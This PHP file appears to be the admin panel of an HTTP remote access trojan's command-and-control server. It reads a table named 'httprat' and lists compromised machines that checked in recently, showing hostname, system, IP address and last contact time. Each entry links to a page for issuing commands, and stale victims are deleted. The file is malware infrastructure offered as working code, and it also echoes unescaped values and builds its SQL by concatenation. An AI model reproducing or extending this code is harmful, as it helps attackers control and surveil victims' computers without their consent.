<?php
require("config.php");
$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();

}

if (isset($_SESSION["admin"]))
{
	echo '<table width="90%" align="center">';
	echo '<th>Computer_id</th><th>Version</th><th>HostName</th><th>System</th><th>IP Address</th><th>Last Sign-in Time</th>';


	$timenow = time();
	$result = $mysqli->query("SELECT * FROM httprat");
	while($row = $result->fetch_assoc())
	{
			$lasttime = $row["lasttime"];
			if (($timenow - strtotime($lasttime)) <= 200)
			{      //<a href="url">Link text</a>
				echo '<tr align=center>';
				echo '<td>'.'<a href="submit.php?id='.$row["id"].'">'.$row["id"].'</a>'.'</td>';
				echo '<td>'.$row["ver"].'</td>';
				echo '<td>'.$row["name"].'</td>';
				echo '<td>'.$row["system"].'</td>';
				echo '<td>'.$row["IP"].'</td>';
				echo '<td>'.$row["lasttime"].'</td>';
				echo '</tr>';
			}
			else
			   {$mysqli->query('delete FROM httprat where id='.$row["id"]);}
	}
	$result->close();
}

$mysqli->close();


?>